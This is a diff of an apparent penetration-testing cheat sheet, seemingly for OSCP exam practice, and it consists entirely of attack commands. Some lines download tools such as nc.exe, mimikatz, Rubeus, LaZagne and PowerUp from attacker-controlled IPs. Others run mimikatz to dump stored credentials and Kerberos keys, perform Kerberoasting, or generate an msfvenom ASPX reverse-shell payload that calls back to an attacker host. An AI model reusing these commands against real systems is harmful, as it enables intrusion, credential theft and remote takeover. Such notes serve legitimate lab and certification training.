@@ -1,6 +1,6 @@
 curl.exe http://192.168.45.206:8000/spoofer.exe -o spoofer.exe
 
-curl.exe http://192.168.45.224/nc.exe -o nc.exe
+curl.exe http://10.10.87.153/nc.exe -o nc.exe
 
 curl.exe http://192.168.45.224/agent.exe -o agent.exe
 .\agent.exe -connect 192.168.45.224:11601 -ignore-cert
@@ -25,12 +25,14 @@ curl.exe http://192.168.45.224/PrintSpoofer64.exe -o spoofer.exe
 
 certutil.exe -f -split -urlcache http://10.10.161.147/nc.exe
 
-curl.exe http://10.10.161.147/mimikatz.exe -o mimikatz.exe
+curl.exe http://10.10.87.153/mimikatz.exe -o mimikatz.exe
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 
 curl.exe http://192.168.45.224:8000/lazagne.exe -o lazagne.exe
 
-curl.exe http://192.168.45.224/Rubeus.exe -o rubeus.exe
+curl.exe http://10.10.87.153/Rubeus.exe -o Rubeus.exe
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
 
 cmd /c dir /s /b ConsoleHost_history.txt
 
@@ -62,7 +64,7 @@ sudo systemd-nspawn -M compiler
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.224 LPORT=443 -f aspx > backup.aspx
 
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
 
 impacket-GetUserSPNs -dc-ip ip=10.10.199.146 oscp.exam/Mary.Williams -request
 
@@ -76,6 +78,8 @@ systeminfo | findstr /B "Domain"
 iwr -uri http://192.168.45.24/PowerUp.ps1 -Outfile PowerUp.ps1
 
 https://powersploit.readthedocs.io/en/latest/Privesc/
+
+
 
 
 
